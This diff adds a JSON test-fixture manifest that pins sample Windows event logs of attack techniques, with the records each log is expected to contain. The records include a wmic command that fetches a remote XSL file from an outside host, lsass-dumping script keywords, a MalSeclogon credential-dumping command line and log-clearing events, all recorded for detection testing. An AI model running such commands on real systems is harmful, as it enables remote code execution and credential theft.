@@ -1,0 +1,57 @@
+{
+  "repository": "https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES",
+  "revision": "4ceed2f4706daf601c212a8f91c113dd85349a2c",
+  "mode": "curated-samples",
+  "notes": "Independent scenario fixtures, not a continuous incident. Expectations describe observed records, not a promise that every sample triggers a rule. Hashes pin file contents even when the sample checkout advances.",
+  "scenarios": [
+    {
+      "id": "security-wmi-process",
+      "path": "Lateral Movement/LM_WMI_4624_4688_TargetHost.evtx",
+      "sha256": "3ff3fcdb55c08ec0eaa39b25c1e02a205314f367bcedc662586bd063185ca41d",
+      "records": [{"Event.System.EventID": 4688, "Event.System.EventRecordID": 563298, "Event.System.Channel": "Security", "Event.System.Computer": "WIN-77LTAPHIQ1R.example.corp", "Event.EventData.NewProcessName": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe", "Event.EventData.CommandLine": ""}]
+    },
+    {
+      "id": "sysmon-wmic-xsl",
+      "path": "Execution/exec_wmic_xsl_internet_sysmon_3_1_11.evtx",
+      "sha256": "8b3448717a53b1c3e0dc4803b128da844f052bdd5c9d6afac99b69148e89ef94",
+      "records": [
+        {"Event.System.EventID": 1, "Event.System.EventRecordID": 892, "Event.System.Channel": "Microsoft-Windows-Sysmon/Operational", "Event.System.Computer": "IEWIN7", "Event.EventData.CommandLine": "wmic  process list /format:\"https://a.uguu.se/x50IGVBRfr55_test.xsl\"", "Event.EventData.ProcessGuid": "365ABB72-CF01-5CE6-0000-00105DA50C00"},
+        {"Event.System.EventID": 3, "Event.System.EventRecordID": 895, "Event.System.Channel": "Microsoft-Windows-Sysmon/Operational", "Event.System.Computer": "IEWIN7", "Event.EventData.DestinationIp": "45.76.12.27", "Event.EventData.DestinationPort": 443, "Event.EventData.ProcessGuid": "365ABB72-CF01-5CE6-0000-00105DA50C00"},
+        {"Event.System.EventID": 11, "Event.System.EventRecordID": 894, "Event.System.Channel": "Microsoft-Windows-Sysmon/Operational", "Event.System.Computer": "IEWIN7", "Event.EventData.TargetFilename": "C:\\Users\\IEUser\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\\S97WTYG7\\x50IGVBRfr55_test[1].xsl", "Event.EventData.ProcessGuid": "365ABB72-CF01-5CE6-0000-00105DA50C00"}
+      ]
+    },
+    {
+      "id": "powershell-minidump",
+      "path": "Credential Access/Powershell_4104_MiniDumpWriteDump_Lsass.evtx",
+      "sha256": "54ff62eff26af588782e066b7b3b1b952bc83e1b75a84d81f9492e654cb5c319",
+      "records": [{"Event.System.EventID": 4104, "Event.System.EventRecordID": 971, "Event.System.Channel": "Microsoft-Windows-PowerShell/Operational", "Event.System.Computer": "MSEDGEWIN10", "Event.EventData.ScriptBlockId": "27f08bda-c330-419f-b83b-eb5c0f699930", "Event.EventData.Path": "C:\\Users\\Public\\lsass_wer_ps.ps1"}],
+      "contains": {"Event.EventData.ScriptBlockText": ["Get-Process lsass", "MiniDumpWriteDump"]}
+    },
+    {
+      "id": "rpc-efsr",
+      "path": "Credential Access/CA_PetiPotam_etw_rpc_efsr_5_6.evtx",
+      "sha256": "0a5d1831b776a472e0337c9629b615a939df3d4c8fe5d582a0356887ac9dc4eb",
+      "records": [{"Event.System.EventID": 5, "Event.System.EventRecordID": 185281, "Event.System.Channel": null, "Event.System.Computer": "LAPTOP-JU4M3I0E", "Event.System.Provider_attributes.Name": "Microsoft-Windows-RPC", "Event.EventData.InterfaceUuid": "C681D488-D850-11D0-8C52-00C04FD90F7E", "Event.EventData.ProcNum": 0, "Event.EventData.Endpoint": "\\pipe\\lsarpc"}]
+    },
+    {
+      "id": "security-cleared",
+      "path": "Defense Evasion/DE_1102_security_log_cleared.evtx",
+      "sha256": "a0615707b547a2ac254688fd725c3c590f62440fc9b7947c2843dd40498a39e8",
+      "records": [{"Event.System.EventID": 1102, "Event.System.EventRecordID": 452811, "Event.System.Channel": "Security", "Event.System.Computer": "PC01.example.corp", "Event.UserData.LogFileCleared.SubjectUserName": "user01"}]
+    },
+    {
+      "id": "system-cleared",
+      "path": "Defense Evasion/DE_104_system_log_cleared.evtx",
+      "sha256": "5579cdca073ee4864ea82d656aa2d25400b5c1e85b8e688db5d85f6dc558c2af",
+      "records": [{"Event.System.EventID": 104, "Event.System.EventRecordID": 27736, "Event.System.Channel": "System", "Event.System.Computer": "PC01.example.corp", "Event.UserData.LogFileCleared.Channel": "System", "Event.UserData.LogFileCleared.SubjectUserName": "user01"}]
+    },
+    {
+      "id": "filtered-malseclogon-gaps",
+      "path": "Credential Access/tutto_malseclogon.evtx",
+      "sha256": "7f8651fa3ed49bb02a0760e3b4124e08aa0579d580395ea1b1c8c24332fce092",
+      "expected_gap_kind": "record_id",
+      "gap_interpretation": "coverage-only: continuity is not established for this curated mixed-channel export",
+      "records": [{"Event.System.EventID": 1, "Event.System.EventRecordID": 619515, "Event.System.Channel": "Microsoft-Windows-Sysmon/Operational", "Event.System.Computer": "MSEDGEWIN10", "Event.EventData.CommandLine": "MalSeclogon.exe  -p 636 -d 2", "Event.EventData.ProcessGuid": "747F3D96-9ACD-61AF-D301-000000000102"}]
+    }
+  ]
+}
